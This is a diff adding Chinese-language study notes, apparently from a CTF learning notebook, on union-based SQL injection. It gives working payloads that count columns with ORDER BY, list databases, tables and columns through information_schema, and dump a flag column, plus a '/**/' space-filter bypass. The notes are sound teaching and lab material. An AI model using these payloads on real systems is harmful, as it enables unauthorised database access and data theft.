@@ -64,7 +64,53 @@ if (isset($_GET['id'])) {
 }
 ```
 
-// TODO
+首先, 我们应该确认列数. 只要 SQL 语句没有报错, 则成立, 取成立的最大值即可.
+
+这里使用 `Order by 1~n` 来判断列数. 当 n=3 的时候, 代码报错, 说明其实只有两列
+
+![[attachments/Pasted image 20250412213808.png]]
+
+随后, 使用联合查询 Union, 获取所有的数据库名称:
+
+```sql
+1 union SELECT 1,schema_name FROM information_schema.schemata;
+```
+
+![[attachments/Pasted image 20250412214008.png]]
+
+有了所有数据库的名称, 就可以查看需要查询的数据库的表名是什么了:
+
+```php
+1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=/*数据库名称 需要加引号*/"admin";
+```
+
+本题查询 `test` 表, 可以看到如下内容:
+
+![[attachments/Pasted image 20250412214807.png]]
+
+随后, 可以查询对应列的内容. (这里和上面不同的是, 使用的是 `.columns`)
+
+```php
+1 union select 1,group_concat(column_name) from information_schema.columns where table_schema="test";
+```
+
+![[attachments/Pasted image 20250412215100.png]]
+
+随后, 获取对应的列的内容是什么:
+
+```php
+1 union select 1,group_concat(i_am_f1ag_column/*列*/) from f1ag_table/*表*/
+```
+
+![[attachments/Pasted image 20250412220003.png]]
+
+> [!warning] 注意
+> 这里的列名和表名都没有引号!  直接写即可, 否则会报错.
+
+### 字符型注入
+
+TODO
+
 ### 空格过滤绕过
 
 如果需要过滤空格, 可以使用注释 `/**/` 来绕过. 直接放在语句中间即可代表空格, 比如这样子的 payload:
